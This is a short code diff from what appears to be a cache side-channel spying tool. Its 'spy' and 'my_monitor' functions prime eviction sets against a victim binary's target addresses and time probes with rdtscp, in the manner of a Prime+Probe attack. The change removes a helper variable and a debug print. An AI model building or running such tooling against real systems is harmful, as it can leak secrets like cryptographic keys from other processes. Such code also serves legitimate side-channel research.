@@ -174,11 +174,8 @@ void my_monitor(Config *spy_conf, Targets *targets){
         unsigned long long old_tsc, tsc;
         __asm__ __volatile__ ("rdtscp" : "=A" (tsc));
 
-        // Print information on first iteration.
-        int first=targets->number;
-
         // wait 4000*no. of targets, eviction w 16 elems takes 1900 cycles, w 27 elems takes 3700 cycles
-        unsigned long long diff = 4000*first;
+        unsigned long long diff = 4000*targets->number;
         
         // Prime
         for(size_t i=0; i<targets->number; i++) probe_evset_chase(spy_conf, targets->addresses[i]->evset);
@@ -225,7 +222,6 @@ void spy(char *victim_filepath, char *offset_filepath){
         }
     }
     printf(" now...\n");
-    for(size_t i=0; i<targets->number; i++) list_print(targets->addresses[i]->evset);
     my_monitor(spy_conf, targets);
 }
 
